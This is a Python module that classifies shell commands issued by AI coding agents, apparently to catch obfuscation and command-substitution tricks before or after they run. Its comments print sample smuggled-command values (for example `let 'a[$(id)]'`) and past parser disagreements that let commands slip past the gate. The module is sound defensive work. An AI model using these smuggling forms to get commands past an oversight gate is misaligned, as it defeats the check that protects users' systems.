"""EQUIPA bash_security — shell-command obfuscation detector.

Ported from Claude Code's bashSecurity.ts. :func:`check_bash_command`
classifies a shell command as safe/unsafe with about two dozen checks
(command substitution, IFS injection, heredoc smuggling, unicode
whitespace, redirect targets, etc.). It is a pure classifier — it never
runs anything itself.

Quoting is read ONCE by a shared tokenizer (``_scan_shell``) and every
quote-sensitive check reads its classification. The tokenizer is a model of
the bash constructs it lists, not bash, and it has disagreed with bash
before (IND3128-01/02), so the checker is built to fail closed:
backslash-newline continuations are joined first, as bash does; a command
the tokenizer cannot parse to a clean end is refused (check 25); and
substitution-looking text (``$(``, ``$[``, a backtick, ``<(``, ``>(``)
counts as live unless it is proven inert - a top-level single-quoted word,
a ``\\$`` or ``\\``` directly inside a top-level double-quoted string, or a
quoted heredoc body, and none of those when the command also evaluates text
as arithmetic, which expands an array subscript again (check 26). Known
limits are listed in docs/BASHSECURITY-WORKAROUNDS.md.

What it is NOT: a permission policy or a sandbox. It looks for
parser-confusion and substitution tricks; plainly destructive commands
(``rm -rf build/``, ``bash script.sh``, ``git push --force``) pass. Redirect
targets are judged textually (no symlink resolution), and commands longer
than ``MAX_COMMAND_BYTES`` are refused outright.

Where the classification is enforced depends on the call site, and the two
enforcement modes have very different guarantees. Do NOT overclaim either:

* **Reactive (streaming roles only).** The streaming loop in
  ``equipa.agent_runner`` inspects each Bash tool call in the Claude CLI's
  stream-JSON output and, on an unsafe verdict, terminates the agent run.
  The CLI has ALREADY executed the tool call by the time the observer sees
  it — this is post-hoc *detect-and-terminate*, NOT prevention. Roles that
  run without streaming (the early-term-exempt ones, e.g. planner,
  evaluator, reviewers, researcher) are never checked this way.

* **Pre-execution (feature flag ``bash_security_pretooluse``, default OFF
  in code).** When enabled, ``agent_runner`` wires
  ``hooks/pretooluse_bash_gate.py`` into the spawned CLI as a Claude Code
  PreToolUse hook (via a generated ``--settings`` file). The hook calls this
  module BEFORE the Bash tool runs and blocks an unsafe command (exit 2) so
  it never executes; it fails closed (exit 2) when it cannot load or run
  this module. This is the only mode that prevents execution; it applies to
  every agent whose CLI ``build_cli_command`` builds, streaming or not.

Pure Python stdlib — NO pip dependencies. Uses ``re`` for regex patterns.

Layer 5: No EQUIPA imports (standalone utility module) — this is what lets
``hooks/pretooluse_bash_gate.py`` load it in isolation without dragging in
the rest of the orchestrator.

Copyright 2026 Forgeborn
"""

from __future__ import annotations

import bisect
import functools
import logging
import posixpath
import re
import shlex
from dataclasses import dataclass

log = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Result type
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class BashSecurityResult:
    """Result of a bash security check.

    Attributes:
        safe: True if the command passed all checks.
        check_id: Numeric identifier of the check that triggered (0 if safe).
        message: Human-readable description of the violation.
    """
    safe: bool
    check_id: int = 0
    message: str = ""


# Sentinel for "command is safe"
_SAFE = BashSecurityResult(safe=True)


# ---------------------------------------------------------------------------
# Check IDs — mirrors BASH_SECURITY_CHECK_IDS from bashSecurity.ts
# ---------------------------------------------------------------------------

class CheckID:
    """Numeric check identifiers matching Claude Code convention."""
    INCOMPLETE_COMMANDS = 1
    JQ_SYSTEM_FUNCTION = 2
    JQ_FILE_ARGUMENTS = 3
    OBFUSCATED_FLAGS = 4
    SHELL_METACHARACTERS = 5
    DANGEROUS_VARIABLES = 6
    NEWLINES = 7
    COMMAND_SUBSTITUTION = 8
    INPUT_REDIRECTION = 9
    OUTPUT_REDIRECTION = 10
    IFS_INJECTION = 11
    PROC_ENVIRON_ACCESS = 13
    BACKSLASH_ESCAPED_WHITESPACE = 15
    BRACE_EXPANSION = 16
    CONTROL_CHARACTERS = 17
    UNICODE_WHITESPACE = 18
    HEREDOC_IN_SUBSTITUTION = 19
    MID_WORD_HASH = 19  # shares slot with heredoc (different check context)
    GIT_COMMIT_SUBSTITUTION = 12
    MALFORMED_TOKEN_INJECTION = 14  # Requires shell parser; not implemented (pure stdlib)
    ZSH_DANGEROUS_COMMANDS = 20
    BACKSLASH_ESCAPED_OPERATORS = 21
    COMMENT_QUOTE_DESYNC = 22
    QUOTED_NEWLINE = 23
    COMMAND_TOO_LONG = 24
    UNPARSEABLE_QUOTING = 25
    SUBSTITUTION_LOOKALIKE = 26


# Commands longer than this (UTF-8 bytes) are blocked outright (sandbox-07).
# Every check below is linear, but a hook timeout is a NON-blocking error for
# Claude Code, so a bounded input keeps the gate far inside its time budget.
# Legitimate long inputs belong in a file (Write tool) the command reads.
MAX_COMMAND_BYTES = 16384


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Shared shell tokenizer (task 3128, SECURITY-REVIEW-3121 BS3121-01)
# ---------------------------------------------------------------------------
#
# The checks used to walk the raw string with about a dozen private quote
# models. Words that bash reads as complete - ``$'\''`` and
# ``"$(echo '"')"`` - left those models "inside a quote", so a substitution
# or redirect after them was invisible to checks 8 and 10. _scan_shell
# classifies every character ONCE, modelling bash's parser for the constructs
# it knows (quoting restarts inside $(...) even within double quotes, $'...'
# has backslash escapes, comments and heredoc bodies are not code), and the
# helpers below read that one classification. The model is not bash (task
# 3133 found two more disagreements), so what it cannot parse is refused
# (check 25) and what it cannot prove inert is treated as live (check 26).

# Per-character kinds: the low four bits of a _ShellScan.kinds entry.
_K_CODE = 1        # shell syntax: blanks and operators act here
_K_ESCAPE = 2      # a backslash escaping the next character (code context)
_K_ESCAPED = 3     # the character after that backslash
_K_SQ_DELIM = 4    # ' opening or closing '...'
_K_SQ = 5          # text inside '...'
_K_DQ_DELIM = 6    # " opening or closing "...", and the $ of $"..."
_K_DQ = 7          # literal text inside "..." (its backslashes included)
_K_ANSI_DELIM = 8  # the $' opening and the ' closing $'...'
_K_ANSI = 9        # text inside $'...'
_K_COMMENT = 10    # a # comment, up to (not including) its newline
_K_HEREDOC = 11    # heredoc body and terminator line
_K_PARAM = 12      # text inside ${...} or $[...]
_KIND_MASK = 0x0F
# Flag bits.
_F_NESTED = 0x10   # inside a substitution, ${...}, $[...], "..." or heredoc body
_F_HIDDEN = 0x20   # enclosed by double quotes at some outer level

# Kinds that make up the "unquoted view" (_extract_unquoted).
_UNQUOTED_VIEW_KINDS = frozenset(
    {_K_CODE, _K_ESCAPE, _K_ESCAPED, _K_COMMENT, _K_HEREDOC, _K_PARAM}
)
_QUOTE_DELIMITER_KINDS = frozenset({_K_SQ_DELIM, _K_DQ_DELIM, _K_ANSI_DELIM})

# A code character after which the next character starts a new token
# (bash's metacharacters plus newline). Only there does # open a comment.
_TOKEN_BREAK_CHARS = frozenset(" \t\n;&|<>()")
# Reserved words after which bash still expects a command, so a following
# `case` or `((` is a keyword, not an argument.
_COMMAND_PREFIX_WORDS = frozenset(
    {"if", "then", "else", "elif", "do", "while", "until", "!", "{", "time",
     "for", "select"}
)
_BARE_WORD_RE = re.compile(r"[^\s;&|<>()'\"\\`$]+")
_SCAN_METACHARS = " \t\n;&|<>()"


@dataclass(frozen=True)
class _Heredoc:
    """A ``<<`` heredoc as bash reads it.

    ``terminator_start``/``terminator_end`` delimit the terminator line's
    text (its newline excluded); both equal ``len(command)`` when the body
    runs to the end of the input.
    """
    operator: int
    quoted: bool
    body_start: int
    terminator_start: int
    terminator_end: int
    top_level: bool


@dataclass(frozen=True)
class _Substitution:
    """A ``$(...)`` (arithmetic included) or backtick substitution."""
    kind: str               # "$(" or "`"
    start: int              # index of the $ or the opening backtick
    inner_start: int
    inner_end: int          # len(command) when unterminated
    in_double_quotes: bool  # a double-quoted string encloses it


@dataclass(frozen=True)
class _ShellScan:
    kinds: bytes
    error: str | None
    heredocs: tuple[_Heredoc, ...]
    substitutions: tuple[_Substitution, ...]
    # Index of the backslash of every backslash-newline bash deletes before
    # tokenizing (code, double quotes, ${...}, backticks, unquoted heredoc
    # bodies - not single quotes, $'...', comments or quoted heredoc bodies).
    continuations: tuple[int, ...] = ()
    # Index of every backslash-escaped $ or backtick directly inside a
    # top-level "...": literal text to bash (see _substitution_lookalikes).
    escaped_in_double_quotes: tuple[int, ...] = ()


class _Frame:
    """One open construct on the tokenizer's stack.

    kind: "top", "cmd" ($(...)), "arith" ($((...))), "dparen" (the (( ))
    command), "dq" ("..."), "brace" (${...}), "bracket" ($[...]) or "hdoc"
    (body of an unquoted-delimiter heredoc).
    """
    __slots__ = (
        "kind", "flags", "depth", "word_start", "command_position",
        "substitution", "pending_heredocs",
    )

    def __init__(self, kind: str, flags: int, substitution: int = -1) -> None:
        self.kind = kind
        self.flags = flags          # flag bits for characters inside
        self.depth = 0              # unmatched ( or [ inside the frame
        self.word_start = True      # next character starts a token
        self.command_position = True
        self.substitution = substitution  # index into _ShellScanner.substitutions
        self.pending_heredocs: list[tuple[int, str, bool, bool, bool]] = []


class _ShellScanner:
    """Single pass over a command; see _scan_shell. Linear time."""

    def __init__(self, command: str) -> None:
        self.command = command
        self.length = len(command)
        self.kinds = bytearray(self.length)
        self.error: str | None = None
        self.error_at = self.length
        self.heredocs: list[_Heredoc] = []
        self.substitutions: list[list] = []
        self.stack: list[_Frame] = [_Frame("top", 0)]
        # End indexes of the unquoted heredoc bodies being scanned.
        self.limits: list[int] = []
        # Per open hdoc frame: (terminator_start, terminator_end, resume_at).
        self.heredoc_ends: list[tuple[int, int, int]] = []
        # Heredoc specs still waiting for their body after the current line.
        self.body_queue: list[tuple[int, str, bool, bool, bool]] = []
        self.continuations: list[int] = []
        self.escaped_in_double_quotes: list[int] = []

    # -- helpers -----------------------------------------------------------

    def note_continuation(self, index: int) -> None:
        """Record *index* if it is a backslash bash joins with a newline.

        Called only where bash's lexer deletes backslash-newline (IND3128-01);
        _join_line_continuations removes the recorded pairs and rescans.
        """
        if index + 1 < self.limit() and self.command[index + 1] == "\n":
            self.continuations.append(index)

    def fail(self, reason: str, index: int) -> int:
        if self.error is None:
            self.error = reason
            self.error_at = index
        return self.length

    def mark(self, start: int, end: int, kind: int, flags: int) -> None:
        if end > start:
            self.kinds[start:end] = bytes((kind | flags,)) * (end - start)

    def limit(self) -> int:
        return self.limits[-1] if self.limits else self.length

    def push(self, kind: str, parent: _Frame, substitution: int = -1) -> _Frame:
        flags = parent.flags | _F_NESTED
        if kind == "dq":
            flags |= _F_HIDDEN
        frame = _Frame(kind, flags, substitution)
        self.stack.append(frame)
        return frame

    def record_substitution(self, kind: str, start: int, inner: int, flags: int) -> int:
        self.substitutions.append(
            [kind, start, inner, self.length, bool(flags & _F_HIDDEN)]
        )
        return len(self.substitutions) - 1

    # -- shared constructs -------------------------------------------------

    def single_quote(self, index: int, flags: int) -> int:
        close = self.command.find("'", index + 1, self.limit())
        if close < 0:
            return self.fail("unterminated single quote", index)
        self.mark(index, index + 1, _K_SQ_DELIM, flags)
        self.mark(index + 1, close, _K_SQ, flags)
        self.mark(close, close + 1, _K_SQ_DELIM, flags)
        return close + 1

    def ansi_c_quote(self, index: int, flags: int) -> int:
        """``$'...'``: a backslash escapes any character, ``\\'`` included."""
        limit = self.limit()
        close = index + 2
        while close < limit and self.command[close] != "'":
            close += 2 if self.command[close] == "\\" else 1
        if close >= limit:
            return self.fail("unterminated $'...' quote", index)
        self.mark(index, index + 2, _K_ANSI_DELIM, flags)
        self.mark(index + 2, close, _K_ANSI, flags)
        self.mark(close, close + 1, _K_ANSI_DELIM, flags)
        return close + 1

    def backtick(self, index: int, flags: int) -> int:
        """`...`: bash ends it at the next unescaped backtick, quotes or not."""
        limit = self.limit()
        close = index + 1
        while close < limit and self.command[close] != "`":
            close += 2 if self.command[close] == "\\" else 1
        if close >= limit:
            self.record_substitution("`", index, index + 1, flags)
            return self.fail("unterminated backtick substitution", index)
        self.substitutions.append(
            ["`", index, index + 1, close, bool(flags & _F_HIDDEN)]
        )
        self.mark(index, index + 1, _K_CODE, flags)
        inner_flags = flags | _F_NESTED
        position = index + 1
        while position < close:
            if self.command[position] == "\\" and position + 1 < close:
                self.note_continuation(position)
                self.mark(position, position + 1, _K_ESCAPE, inner_flags)
                self.mark(position + 1, position + 2, _K_ESCAPED, inner_flags)
                position += 2
                continue
            self.mark(position, position + 1, _K_CODE, inner_flags)
            position += 1
        self.mark(close, close + 1, _K_CODE, flags)
        return close + 1

    def dollar(self, index: int, frame: _Frame) -> int | None:
        """Open ``$(``, ``$((``, ``${`` or ``$[`` at *index*; None if none."""
        command = self.command
        nxt = command[index + 1] if index + 1 < self.limit() else ""
        if nxt == "(":
            arith = index + 2 < self.limit() and command[index + 2] == "("
            sub = self.record_substitution("$(", index, index + 2, frame.flags)
            self.mark(index, index + 2, _K_CODE, frame.flags)
            self.push("arith" if arith else "cmd", frame, sub)
            return index + 2
        if nxt in ("{", "["):
            self.mark(index, index + 2, _K_CODE, frame.flags)
            self.push("brace" if nxt == "{" else "bracket", frame)
            return index + 2
        return None

    def close_frame(self, index: int, width: int = 1) -> int:
        frame = self.stack.pop()
        parent = self.stack[-1]
        if frame.pending_heredocs:
            return self.fail("heredoc has no body before its substitution closes", index)
        if frame.substitution >= 0:
            self.substitutions[frame.substitution][3] = index
        kind = _K_DQ_DELIM if frame.kind == "dq" else _K_CODE
        self.mark(index, index + width, kind, parent.flags)
        # (( )) is a whole token; any other construct is part of a word.
        parent.word_start = frame.kind == "dparen"
        parent.command_position = False
        return index + width

    # -- heredocs ----------------------------------------------------------

    def heredoc_operator(self, index: int, frame: _Frame) -> int:
        """``<<`` / ``<<-`` and its delimiter word (never expanded)."""
        command = self.command
        limit = self.limit()
        position = index + 2
        strip_tabs = position < limit and command[position] == "-"
        if strip_tabs:
            position += 1
        self.mark(index, position, _K_CODE, frame.flags)
        while position < limit and command[position] in " \t":
            self.mark(position, position + 1, _K_CODE, frame.flags)
            position += 1
        literal: list[str] = []
        quoted = False
        word_start = position
        while position < limit and command[position] not in _SCAN_METACHARS:
            ch = command[position]
            if ch in "$`" or (ch == "#" and position == word_start):
                return self.fail("heredoc delimiter is not a plain word", position)
            if ch == "\\":
                # `<<E\<newline>OF` is the UNQUOTED delimiter EOF to bash;
                # the join pass removes the pair and rescans.
                self.note_continuation(position)
                quoted = True
                self.mark(position, position + 1, _K_ESCAPE, frame.flags)
                if position + 1 < limit:
                    self.mark(position + 1, position + 2, _K_ESCAPED, frame.flags)
                    if command[position + 1] != "\n":
                        literal.append(command[position + 1])
                position += 2
                continue
            if ch == "'":
                quoted = True
                close = command.find("'", position + 1, limit)
                if close < 0:
                    return self.fail("unterminated single quote", position)
                literal.append(command[position + 1:close])
                self.mark(position, position + 1, _K_SQ_DELIM, frame.flags)
                self.mark(position + 1, close, _K_SQ, frame.flags)
                self.mark(close, close + 1, _K_SQ_DELIM, frame.flags)
                position = close + 1
                continue
            if ch == '"':
                quoted = True
                close = position + 1
                while close < limit and command[close] != '"':
                    if command[close] in "$`":
                        return self.fail("heredoc delimiter is not a plain word", close)
                    if command[close] == "\\" and close + 1 < limit:
                        if command[close + 1] in '"\\':
                            literal.append(command[close + 1])
                        elif command[close + 1] != "\n":
                            literal.append(command[close:close + 2])
                        close += 2
                        continue
                    literal.append(command[close])
                    close += 1
                if close >= limit:
                    return self.fail("unterminated double quote", position)
                self.mark(position, position + 1, _K_DQ_DELIM, frame.flags)
                self.mark(position + 1, close, _K_DQ, frame.flags | _F_NESTED)
                self.mark(close, close + 1, _K_DQ_DELIM, frame.flags)
                position = close + 1
                continue
            literal.append(ch)
            self.mark(position, position + 1, _K_CODE, frame.flags)
            position += 1
        if position == word_start:
            return self.fail("heredoc operator without a delimiter word", index)
        top_level = len(self.stack) == 1
        frame.pending_heredocs.append(
            (index, "".join(literal), quoted, strip_tabs, top_level)
        )
        frame.word_start = False
        frame.command_position = False
        return position

    def find_terminator(
        self, start: int, delimiter: str, quoted: bool, strip_tabs: bool
    ) -> tuple[int, int, int]:
        """Return (terminator_start, terminator_end, resume_at) for a body at
        *start*. An unquoted body joins a line ending in an odd backslash run
        to the next one before comparing, as bash does."""
        command = self.command
        limit = self.limit()
        line_start = start
        while line_start < limit:
            logical: list[str] = []
            position = line_start
            while True:
                newline = command.find("\n", position, limit)
                end = limit if newline < 0 else newline
                text = command[position:end]
                if strip_tabs:
                    text = text.lstrip("\t")
                if not quoted and newline >= 0:
                    run = len(text) - len(text.rstrip("\\"))
                    if run % 2 == 1:
                        logical.append(text[:-1])
                        position = newline + 1
                        continue
                logical.append(text)
                break
            if "".join(logical) == delimiter:
                return line_start, end, (end + 1 if newline >= 0 else end)
            if newline < 0:
                break
            line_start = newline + 1
        return limit, limit, limit

    def start_heredoc_bodies(self, index: int) -> int:
        """Read queued heredoc bodies starting at *index*; return resume point."""
        while self.body_queue and self.error is None:
            operator, delimiter, quoted, strip_tabs, top_level = self.body_queue.pop(0)
            flags = self.stack[-1].flags
            term_start, term_end, resume = self.find_terminator(
                index, delimiter, quoted, strip_tabs
            )
            self.heredocs.append(
                _Heredoc(operator, quoted, index, term_start, term_end, top_level)
            )
            if quoted:
                self.mark(index, resume, _K_HEREDOC, flags | _F_NESTED)
                index = resume
                continue
            self.push("hdoc", self.stack[-1])
            self.limits.append(term_start)
            self.heredoc_ends.append((term_start, term_end, resume))
            return index
        return index

    def finish_heredoc_body(self) -> int:
        self.stack.pop()
        self.limits.pop()
        term_start, _term_end, resume = self.heredoc_ends.pop()
        self.mark(term_start, resume, _K_HEREDOC, self.stack[-1].flags | _F_NESTED)
        return self.start_heredoc_bodies(resume)

    # -- per-context steps -------------------------------------------------

    def step_code(self, index: int, frame: _Frame) -> int:
        command = self.command
        ch = command[index]
        flags = frame.flags
        limit = self.limit()
        nxt = command[index + 1] if index + 1 < limit else ""
        in_arith = frame.kind in ("arith", "dparen")

        if ch == "\\":
            self.note_continuation(index)
            self.mark(index, index + 1, _K_ESCAPE, flags)
            if nxt:
                self.mark(index + 1, index + 2, _K_ESCAPED, flags)
                if nxt != "\n":  # \<newline> is removed: token state unchanged
                    frame.word_start = False
                    frame.command_position = False
            return index + 2
        if ch == "'" or (ch == "$" and nxt == "'"):
            if in_arith:
                # IND3128-02: (( )) and $(( )) expand like double quotes, so
                # an apostrophe is an ordinary character there and a $(...)
                # between two of them RUNS. Bash's parser still pairs them
                # to find the closing )), so no single model is right.
                return self.fail("single quote inside arithmetic", index)
            frame.word_start = frame.command_position = False
            if ch == "'":
                return self.single_quote(index, flags)
            return self.ansi_c_quote(index, flags)
        if ch == "$":
            if nxt == '"':
                frame.word_start = frame.command_position = False
                self.mark(index, index + 2, _K_DQ_DELIM, flags)
                self.push("dq", frame)
                return index + 2
            opened = self.dollar(index, frame)
            if opened is not None:
                frame.word_start = frame.command_position = False
                return opened
        if ch == '"':
            frame.word_start = frame.command_position = False
            self.mark(index, index + 1, _K_DQ_DELIM, flags)
            self.push("dq", frame)
            return index + 1
        if ch == "`":
            frame.word_start = frame.command_position = False
            return self.backtick(index, flags)

        if not in_arith and frame.word_start:
            if ch == "#":
                newline = command.find("\n", index, limit)
                end = limit if newline < 0 else newline
                self.mark(index, end, _K_COMMENT, flags)
                return end
            if frame.command_position:
                if ch == "(" and nxt == "(":
                    self.mark(index, index + 2, _K_CODE, flags)
                    self.push("dparen", frame)
                    return index + 2
                word = _BARE_WORD_RE.match(command, index, limit)
                if word is not None:
                    end = word.end()
                    # A reserved word only when the whole word is bare.
                    whole = end >= limit or command[end] in _SCAN_METACHARS
                    text = word.group(0) if whole else ""
                    if text == "case" and frame.kind == "cmd":
                        # Its pattern `)`s would close the $( early.
                        return self.fail(
                            "case statement inside $(...) is not supported", index
                        )
                    self.mark(index, end, _K_CODE, flags)
                    frame.word_start = False
                    frame.command_position = text in _COMMAND_PREFIX_WORDS
                    return end

        if ch == "\n" and not in_arith:
            self.mark(index, index + 1, _K_CODE, flags)
            frame.word_start = frame.command_position = True
            if any(f.pending_heredocs for f in self.stack[:-1]):
                return self.fail(
                    "heredoc body would start inside a multi-line substitution",
                    index,
                )
            if frame.pending_heredocs:
                if self.limits:
                    return self.fail("heredoc inside a heredoc body", index)
                self.body_queue = frame.pending_heredocs
                frame.pending_heredocs = []
                return self.start_heredoc_bodies(index + 1)
            return index + 1
        if ch == "<" and nxt == "<" and not in_arith:
            if command.startswith("<<<", index):
                self.mark(index, index + 3, _K_CODE, flags)
                frame.word_start = frame.command_position = True
                return index + 3
            if self.limits:
                return self.fail("heredoc inside a heredoc body", index)
            return self.heredoc_operator(index, frame)

        if frame.kind != "top":
            if ch == "(":
                frame.depth += 1
            elif ch == ")":
                if frame.depth > 0:
                    frame.depth -= 1
                elif frame.kind == "dparen":
                    if nxt != ")":
                        return self.fail(
                            "'((' that is not an arithmetic command; write '( ('",
                            index,
                        )
                    return self.close_frame(index, 2)
                else:
                    return self.close_frame(index)
        self.mark(index, index + 1, _K_CODE, flags)
        if ch in _TOKEN_BREAK_CHARS:
            frame.word_start = True
            if ch not in " \t<>":
                frame.command_position = ch != ")"
        else:
            frame.word_start = frame.command_position = False
        return index + 1

    def step_double_quoted(self, index: int, frame: _Frame) -> int:
        command = self.command
        ch = command[index]
        if ch == "\\":
            self.note_continuation(index)
            end = min(index + 2, self.limit())
            # Stack [top, dq]: the string is not inside any other construct.
            if end == index + 2 and command[index + 1] in "$`" and len(self.stack) == 2:
                self.escaped_in_double_quotes.append(index + 1)
            self.mark(index, end, _K_DQ, frame.flags)
            return index + 2
        if ch == '"':
            return self.close_frame(index)
        if ch == "`":
            return self.backtick(index, frame.flags)
        if ch == "$":
            opened = self.dollar(index, frame)
            if opened is not None:
                return opened
        self.mark(index, index + 1, _K_DQ, frame.flags)
        return index + 1

    def step_group(self, index: int, frame: _Frame) -> int:
        """Inside ${...} or $[...]: quotes pair up, substitutions nest.

        Apostrophes are the exception (IND3128-02). ``$[...]`` is
        arithmetic, where they are ordinary characters that bash's parser
        still pairs, so they are refused. Inside double quotes, the word of
        ``${x:-...}`` (and ``:+``, ``:=``, ``:?``) is expanded with
        apostrophes as ordinary characters, so a ``$(...)`` between two of
        them runs; the pattern operators (``#``, ``%``, ``/``) treat them as
        quotes. They are read as ordinary characters for every operator:
        a ``$(...)`` there is then always seen, which fails closed. An
        unquoted heredoc body expands like double quotes, so the same holds
        for every ``${...}`` scanned while a body is open (self.limits).
        """
        command = self.command
        ch = command[index]
        flags = frame.flags
        nxt = command[index + 1] if index + 1 < self.limit() else ""
        literal_apostrophe = frame.kind == "brace" and (
            bool(flags & _F_HIDDEN) or bool(self.limits)
        )
        if ch == "\\":
            self.note_continuation(index)
            self.mark(index, min(index + 2, self.limit()), _K_PARAM, flags)
            return index + 2
        if ch == "'" or (ch == "$" and nxt == "'"):
            if frame.kind == "bracket":
                return self.fail("single quote inside $[...] arithmetic", index)
            if not literal_apostrophe:
                if ch == "'":
                    return self.single_quote(index, flags)
                return self.ansi_c_quote(index, flags)
            if ch == "'":
                self.mark(index, index + 1, _K_PARAM, flags)
                return index + 1
        if ch == '"':
            self.mark(index, index + 1, _K_DQ_DELIM, flags)
            self.push("dq", frame)
            return index + 1
        if ch == "`":
            return self.backtick(index, flags)
        if ch == "$":
            opened = self.dollar(index, frame)
            if opened is not None:
                return opened
        if frame.kind == "brace" and ch == "}":
            return self.close_frame(index)
        if frame.kind == "bracket":
            if ch == "[":
                frame.depth += 1
            elif ch == "]":
                if frame.depth == 0:
                    return self.close_frame(index)
                frame.depth -= 1
        self.mark(index, index + 1, _K_PARAM, flags)
        return index + 1

    def step_heredoc_body(self, index: int, frame: _Frame) -> int:
        """Unquoted-delimiter body: text, but $(...), `...` and ${...} run."""
        command = self.command
        ch = command[index]
        if ch == "\\":
            self.note_continuation(index)
            self.mark(index, min(index + 2, self.limit()), _K_HEREDOC, frame.flags)
            return index + 2
        if ch == "`":
            return self.backtick(index, frame.flags)
        if ch == "$":
            opened = self.dollar(index, frame)
            if opened is not None:
                return opened
        self.mark(index, index + 1, _K_HEREDOC, frame.flags)
        return index + 1

    # -- driver ------------------------------------------------------------

    _UNTERMINATED = {
        "cmd": "unterminated $(...) substitution",
        "arith": "unterminated $((...)) expansion",
        "dparen": "unterminated (( )) command",
        "dq": "unterminated double quote",
        "brace": "unterminated ${...} expansion",
        "bracket": "unterminated $[...] expansion",
    }

    def run(self) -> _ShellScan:
        index = 0
        while self.error is None:
            frame = self.stack[-1]
            if index >= self.limit():
                if frame.kind == "hdoc":
                    index = self.finish_heredoc_body()
                    continue
                if self.limits:
                    self.fail(
                        f"{self._UNTERMINATED[frame.kind]} inside a heredoc body",
                        index,
                    )
                break
            if frame.kind in ("top", "cmd", "arith", "dparen"):
                index = self.step_code(index, frame)
            elif frame.kind == "dq":
                index = self.step_double_quoted(index, frame)
            elif frame.kind == "hdoc":
                index = self.step_heredoc_body(index, frame)
            else:
                index = self.step_group(index, frame)
        if self.error is None and len(self.stack) > 1:
            self.fail(self._UNTERMINATED[self.stack[-1].kind], self.length)
        if self.error is not None:
            # Unparseable: expose the rest as plain top-level code, which the
            # most checks see. Open substitutions keep inner_end == length.
            self.mark(self.error_at, self.length, _K_CODE, 0)
        return _ShellScan(
            kinds=bytes(self.kinds),
            error=self.error,
            heredocs=tuple(self.heredocs),
            substitutions=tuple(_Substitution(*record) for record in self.substitutions),
            continuations=tuple(self.continuations),
            escaped_in_double_quotes=tuple(self.escaped_in_double_quotes),
        )


@functools.lru_cache(maxsize=64)
def _scan_shell(command: str) -> _ShellScan:
    """Classify every character of *command* with the tokenizer's bash model.

    Returns per-character kinds (``_K_*`` with ``_F_*`` flag bits), the
    heredocs and substitutions found, the backslash-newlines bash would
    delete, and ``error`` - a reason string when the command does not reach
    a clean end state (an unterminated quote or substitution, or a construct
    this tokenizer does not model). Every quote-sensitive helper in this
    module reads this one classification. The model is tested against bash
    (tests/test_bash_tokenizer_3128.py) but is not bash: callers must fail
    closed where it cannot prove text inert (_substitution_lookalikes).
    Line continuations are NOT joined here; check_bash_command joins them
    first (_join_line_continuations).
    """
    return _ShellScanner(command).run()


# At most this many join-and-rescan passes (IND3128-01). A pass removes every
# continuation the tokenizer sees; a later pass finds more only when a join
# changed the quoting around another one, which takes deliberately nested
# input. Past the cap the command is refused (check 25).
_MAX_CONTINUATION_PASSES = 8


@dataclass(frozen=True)
class _JoinedCommand:
    """A command with bash's backslash-newline deletions applied."""
    text: str
    origin: tuple[int, ...]  # origin[i] is the index in the original of text[i]
    complete: bool           # False: continuations were left after the cap


def _join_line_continuations(command: str) -> _JoinedCommand:
    """Delete every backslash-newline pair bash deletes before tokenizing.

    Bash removes them first (outside single quotes, ``$'...'``, comments and
    quoted heredoc bodies), so ``$``, backslash-newline, ``(id)`` is the
    command substitution ``$(id)`` and ``<<E``, backslash-newline, ``OF``
    is the unquoted delimiter ``EOF`` (IND3128-01). Every check reads the
    joined text. Removing a pair can change the quoting around a later
    one, so the text is rescanned until none is left.
    """
    text = command
    origin = list(range(len(command)))
    for _ in range(_MAX_CONTINUATION_PASSES):
        continuations = _scan_shell(text).continuations
        if not continuations:
            return _JoinedCommand(text, tuple(origin), True)
        removed = set(continuations)
        removed.update(index + 1 for index in continuations)
        keep = [index for index in range(len(text)) if index not in removed]
        text = "".join(text[index] for index in keep)
        origin = [origin[index] for index in keep]
    return _JoinedCommand(
        text, tuple(origin), not _scan_shell(text).continuations
    )


# The start of something bash may run: ``$(``, ``$[``, a backtick, ``<(``
# or ``>(``. Backslash-newlines between the two characters are allowed for
# the contexts in which bash does not join them (they are judged like any
# other text below); ``${`` counts only in that split form.
_SUBSTITUTION_LOOKALIKE_RE = re.compile(
    r"\$(?:\\\n)*[(\[]|\$(?:\\\n)+\{|`|[<>](?:\\\n)*\("
)

# Constructs that make bash evaluate text again, whatever their arguments:
# arithmetic that expands an array subscript AGAIN (`let 'a[$(id)]'`,
# `x='a[$(id)]'; [[ x -eq 1 ]]`, `${s:x}`, `${@:x}`, `${a[x]}`, `$[x]`,
# `${!x}`, and an assignment of any kind to an integer special such as
# `RANDOM='a[$(id)]'` or `read RANDOM`), the re-parse of a quoted compound
# assignment (`declare -a 'x=($(id))'`, `readonly -a`, `=(`), a mapfile
# callback (`mapfile -C`) and prompt expansion (`${x@P}`, PS4 with set -x).
# Each was checked against bash 5.2 (IND3128-03, IV3133-01). Matched on the
# command with quotes and backslashes deleted (`l'e't` is `let`); a spurious
# match only means a quoted look-alike is no longer trusted.
_EVALUATES_TEXT_RE = re.compile(
    r"=\(|\$\[|\$\{!|\$\{#?(?:\w+|[@*])(?:\[|:(?![-=?+])|@P)"
    r"|(?<![\w.-])(?:let|declare|typeset|local|readonly|export|readarray"
    r"|mapfile|HISTCMD|OPTIND|S?RANDOM|PS[0-4]|PROMPT_COMMAND)(?![\w.-])"
)

# Builtins that evaluate a subscript only in a variable NAME they are given:
# `read 'a[$(id)]'`, `printf -v 'a[$(id)]'`, `[ -v 'a[$(id)]' ]`, `unset`,
# `wait -p`, `getopts`. With plain names (`while read -r f`, `[ -f x ]`,
# `printf '%s\n' ...`) they store or test text and never evaluate it
# (IV3133-01), so they count only when an argument could name a subscript.
_ARGUMENT_EVALUATOR_RE = re.compile(
    r"(?<![\w.-])(?:read|printf|test|wait|getopts|unset)(?![\w.-])"
)

# `((`, `$((` and `for ((` re-expand subscripts through the variables they
# name (`x='a[$(id)]'; (( x ))`). An expression of number literals and
# operators names none (`"$((1+2))"`), so it is the only exception. The
# bound keeps the scan linear; a longer literal expression simply counts.
_ARITHMETIC_OPEN_RE = re.compile(r"\(\(")
_LITERAL_ARITHMETIC_RE = re.compile(r"\(\([0-9\s+\-*/%<>=!&|^~?:,()]{0,256}?\)\)")

# Inside `[[ ]]` only the arithmetic comparisons and -v/-R evaluate their
# operands (`x='a[$(id)]'; [[ x -eq 1 ]]`); `[[ -n "$CI" ]]` does not. The
# operators are parsed, never expanded, so a literal one must be present.
